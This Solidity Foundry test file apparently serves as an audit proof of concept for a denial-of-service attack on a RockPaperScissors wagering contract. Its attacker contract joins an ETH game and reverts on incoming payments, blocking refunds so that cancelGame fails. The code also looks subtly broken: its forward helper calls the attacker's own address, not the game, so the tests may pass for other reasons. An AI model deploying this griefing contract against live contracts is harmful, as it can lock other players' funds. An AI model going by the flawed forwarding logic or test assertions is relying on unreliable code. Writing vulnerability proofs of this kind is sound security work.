// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/WinningToken.sol";
import "../src/RockPaperScissors.sol";
import "forge-std/Test.sol";

contract JoiningWrongGameTypeTest is Test {
    WinningToken token;
    RockPaperScissors game;

    address playerA = makeAddr("playerA");
    address attacker = makeAddr("attacker");
    address admin = makeAddr("admin");

    function setUp() public {
        game = new RockPaperScissors();

        vm.deal(playerA, 10 ether);
        vm.deal(attacker, 10 ether);
        require(playerA.balance == attacker.balance, "Setup failed");
    }

    function createGameWithEth() public returns (uint256) {
        vm.prank(playerA);
        return game.createGameWithEth{value: 1 ether}(1, 5 minutes);
    }

    function attackerJoinsGame(uint256 gameId) public returns (DoS) {
        vm.startPrank(attacker);
        DoS exploit = new DoS{value: 1 ether}(game, gameId);
        exploit.setDenied(true); //In case we want to block refunds
        vm.stopPrank();
        return exploit;
    }

    function playerCommitMove(
        uint256 gameId,
        uint8 move
    ) public returns (bytes32) {
        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, playerA));
        vm.prank(playerA);
        game.commitMove(gameId, keccak256(abi.encodePacked(move, salt)));
        return salt;
    }

    function attackerCommitMove(
        DoS exploit,
        uint256 gameId,
        uint8 move
    ) public returns (bytes32) {
        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, attacker));
        vm.prank(attacker);
        exploit.forward(
            abi.encodeWithSignature(
                "commitMove(uint256,bytes32)",
                gameId,
                keccak256(abi.encodePacked(move, salt))
            )
        );
        return salt;
    }

    function test_dos_cancelGame() public {
        uint256 gameId = createGameWithEth();
        DoS exploit = attackerJoinsGame(gameId);

        playerCommitMove(gameId, 1);
        attackerCommitMove(exploit, gameId, 2);

        vm.warp(block.timestamp + 6 minutes); //A and attacker forget to reveal
        vm.prank(playerA);
        vm.expectRevert();
        game.cancelGame(gameId);
    }

    function test_dos_handleTie() public {
        uint256 gameId = createGameWithEth();
        DoS exploit = attackerJoinsGame(gameId);

        uint8 move = 1;
        bytes32 playerSalt = playerCommitMove(gameId, move);
        bytes32 attackerSalt = attackerCommitMove(exploit, gameId, move);

        vm.prank(attacker);
        exploit.forward(
            abi.encodeWithSignature(
                "revealMove(uint256,uint8,bytes32)",
                gameId,
                move,
                attackerSalt
            )
        );

        vm.prank(playerA);
        vm.expectRevert();
        game.commitMove(gameId, keccak256(abi.encodePacked(move, playerSalt)));
    }
}

contract DoS {
    bool public denied;

    constructor(RockPaperScissors _game, uint256 _gameId) payable {
        _game.joinGameWithEth{value: msg.value}(_gameId);
    }

    function setDenied(bool _denied) external {
        denied = _denied;
    }

    function forward(
        bytes calldata _data
    ) external payable returns (bytes memory) {
        (bool success, bytes memory result) = msg.sender.call{value: msg.value}(
            _data
        );
        require(success, "Forward failed");
        return result;
    }

    receive() external payable {
        if (denied) {
            revert();
        }
    }
}
